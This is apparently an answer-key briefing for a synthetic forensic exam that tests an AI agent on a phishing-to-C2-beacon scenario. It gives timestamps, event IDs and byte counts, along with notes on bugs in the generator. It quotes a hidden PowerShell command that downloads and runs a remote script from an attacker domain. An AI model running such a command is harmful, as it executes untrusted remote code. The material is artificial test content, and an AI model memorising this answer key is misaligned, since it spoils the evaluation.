# Briefing: phishing-c2-beacon

Human-readable ground truth. Do not share with the agent-under-test.

## Provenance

Synthetic data, generated with EvidenceForge v1.17.0, commit
`567073b0ac0a1d7944ea4695e9bde4a305dcebb9`, seed `6602`. Scenario
source:
`forensic-agent-answers/generators/evidenceforge/phishing-c2-beacon/scenario.yaml`.
Sourced from `doc/TEST_EVIDENCEFORGE_PROPOSED_CASES.md` proposal #3.

**Every fact below was independently verified directly against the
rendered XML/JSON data** before being written down. `GROUND_TRUTH.md`
was checked and found inaccurate for the morning-logon event (same
pattern as `insider-dns-tunnel-exfil` — see "Known generator-tooling
notes" below).

## The story, stage by stage

All timestamps UTC.

### Stage 1 — Ordinary morning logon (`WS-JOKAFOR-01`)
**2024-11-04T14:23:33.1189108Z** — Event ID 4624, Logon Type 2
(local/interactive), no `IpAddress`, `TargetLogonId: 0xa2616c2`. James
logging into his own workstation, nothing anomalous by itself.

### Stage 2 — Delivery (`MAIL-01` / sensor `zeek01`)
**2024-11-04T15:02:40Z** (SMTP `Date` header) / **15:04:50Z**
(`zeek01/smtp.json` `ts`, delivery-completion timing) — phishing email
from `billing@invoice-secure-delivery.net` to
`james.okafor@rivermarklegal.com`, subject "Overdue Invoice #4471 -
Immediate Action Required". **`zeek01/smtp.json` does not carry
attachment metadata for this record** (`fuids: []`, no filename/MIME
field) — the attachment's name and type (`Invoice_4471.docm`,
implying a macro-enabled Word document by extension) are only
recoverable from Stage 3's Windows evidence (the `WINWORD.EXE` command
line and the matching Sysmon file-create record), not from the SMTP
log. No attachment sandboxing exists on `MAIL-01` (per
`ENVIRONMENT.md`) — it was delivered unmodified.

### Stage 3 — Execution (`WS-JOKAFOR-01`)
**2024-11-04T15:11:35.2179109Z** — Event ID 4688, `WINWORD.EXE`, PID
`0x12b8` (4792), `SubjectLogonId: 0xa2616c2`, command line opens
`C:\Users\james.okafor\Downloads\Invoice_4471.docm`.

**2024-11-04T15:13:29.1807842Z** — Event ID 4688,
`powershell.exe`, PID `0x12cc` (4812), same `SubjectLogonId`, command
line: `powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX
(New-Object Net.WebClient).DownloadString('https://cdn-updates-svc.net/init.ps1')"`.

**No parent-process evidence links these two events to each other** —
both render with `explorer.exe` (PID 4608) as their parent in both
Security 4688 and Sysmon Event 1. This is a real, confirmed engine
behavior (the scenario's `process_ref`/`parent_ref` fields did not
produce the intended lineage in rendered output — see the paired
generator README) rather than a deliberate design choice, but it was
kept rather than patched around: the causal link between these two
events is fully supportable from timing (< 2 minutes apart, same user
session) and command-line content (the PowerShell command explicitly
references `cdn-updates-svc.net`, the exact domain that becomes the
C2 beacon target in Stage 4). This is a realistic analyst skill —
correlating by timing/content when process-lineage visibility is
incomplete — and Q2 tests exactly this.

### Stage 4 — Stager fetch, then C2 beacon (`WS-JOKAFOR-01` / `zeek01`)
**2024-11-04T15:13:30.27Z** — first DNS resolution of
`cdn-updates-svc.net` → `45.83.221.40` (`zeek01/dns.json`).
**39 total connection records** to `45.83.221.40:443` exist in
`zeek01/conn.json`/`ssl.json`, which break into three distinct groups —
not one uniform "beacon channel":

1. **2024-11-04T15:13:31.53Z** (the very first connection,
   ~1.75s after DNS resolution) — `orig_bytes: 790`, `resp_bytes:
   12194`. This is the stager itself: the PowerShell command from Stage
   3 literally is `DownloadString('https://cdn-updates-svc.net/init.ps1')`
   — a small request, a large response (fetching the next-stage
   script). This is part of *execution*, not the beacon.
2. **37 routine check-ins** — tightly clustered at `orig_bytes`
   ~2,178-2,194, `resp_bytes` ~4,682-4,733, ~5-minute interval,
   consistent with the authored 3-hour duration and 0.15 jitter. This
   is the actual periodic beacon.
3. **One outlier — Stage 5, below.**

An earlier draft of this document and the case's `EXAM.md`/
`grading_schema.md` described this as "39 total, 38 share a profile,
1 doesn't," which is wrong — 37, not 38, share the tight profile, and
the stager-fetch connection is a distinct, meaningful event in its own
right rather than noise to fold into the beacon count. Fixed in v1.1
after an independent Phase 6 audit caught the miscount.

### Stage 5 — Manual command within the beacon channel
**2024-11-04T16:43:46.35Z** — one connection record to the same
`45.83.221.40:443`, `orig_bytes: 620000`, `resp_bytes: 4417` — vs. the
37 routine check-ins' `orig_bytes` ~2,178-2,194 and `resp_bytes`
~4,682-4,733. This one connection carries roughly 280x the outbound
byte volume of a routine check-in — a manual attacker action riding
the established C2 channel, not part of the regular beacon cadence.
**The content of this action is not observable** — the channel is
HTTPS/TLS and no proxy TLS interception is modeled in this
environment, so only connection-level metadata (timing, byte counts)
is available, consistent with `zeek01/ssl.json` showing an opaque
encrypted session for this connection like every other beacon tick.

## The core distinction the exam tests

Two separate discrimination skills, not one: (1) correlating two
process events into one causal chain **without** parent-process
evidence (Q2), and (2) finding the one connection, among 39 nearly
identical ones, that doesn't match the routine profile (Q4). An answer
that finds the beacon but treats every connection within it as
equivalent — never noticing #21 of 39 is an outlier — has found the
infection but missed the actual attacker action.

## Known generator-tooling notes

**`GROUND_TRUTH.md`'s timeline table is wrong for the Stage 1 logon**,
in the same pattern already documented for `insider-dns-tunnel-exfil`:
it claims `"2024-11-04 14:59:32 UTC ... Network logon from
23.129.64.210 (LogonID: 0xa2616c2)"`. The real event with that
`TargetLogonId` is at `14:23:33.1189108Z`, Logon Type 2, blank
`IpAddress` — confirmed directly against the raw XML.
`23.129.64.210` does not appear anywhere in this dataset. This is now
confirmed as a repeatable ground-truth template pattern across two
independently-built scenarios this session, not a one-off — worth
assuming for any future EvidenceForge-generated case rather than
re-discovering each time.

**`process_ref`/`parent_ref` did not produce the declared parent-child
lineage in rendered logs** — see Stage 3 above and the paired generator
README for full detail. This is a real, reproducible engine-behavior
finding, kept and worked into the exam design rather than patched
around.

## Undetermined by design

- **What the manual command in Stage 5 actually did.** Not evidenced —
  this channel is encrypted and no decryption/proxy interception is
  modeled. The exam explicitly asks the agent to state this as an
  acknowledged unknown (Q5), not to guess at content that isn't there.
